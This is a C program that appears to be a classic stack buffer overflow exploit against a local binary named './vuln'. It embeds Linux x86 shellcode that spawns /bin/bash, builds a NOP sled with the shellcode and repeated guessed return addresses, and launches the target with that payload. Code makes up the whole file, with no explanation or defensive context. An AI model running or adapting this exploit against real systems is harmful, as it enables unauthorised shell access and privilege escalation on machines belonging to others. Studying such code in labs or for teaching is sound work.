#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h>
#define BUFF_SIZE 160
#define PROG	  "./vuln"
char shellcode[]=  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46" \
	               "\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e" \
	               "\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8" \
	               "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/bash";
unsigned long get_esp()
{
	__asm__("movl %esp,%eax");
}
int main(int argc, char **argv)
{
	char *exploit, *p;
	long addr,*ptr;
	int size=BUFF_SIZE;
	int offset=0;
	int i;
	addr=get_esp();
	if(argc>1)
		offset=atoi(argv[1]);
	if(argc>2)
		size=atoi(argv[2]);
	if(argc>4)
		addr=strtoul(argv[3],NULL,0);
	addr-=offset;
	printf("\nUsing direction: %p\n",(void *)addr);
	exploit=(char *)malloc(size * sizeof(char));
	ptr=(long *)exploit;
	for(i=0; i<size;i+=4)
		*(ptr++)=addr;
	for(i=0;i<size/2; i++)
		exploit[i]='\x90';
	p=exploit+(size/2);
	for(i=0;i<strlen(shellcode);i++)
		*(p++)=shellcode[i];
	execl(PROG,PROG,exploit,NULL);
	return 0;
}
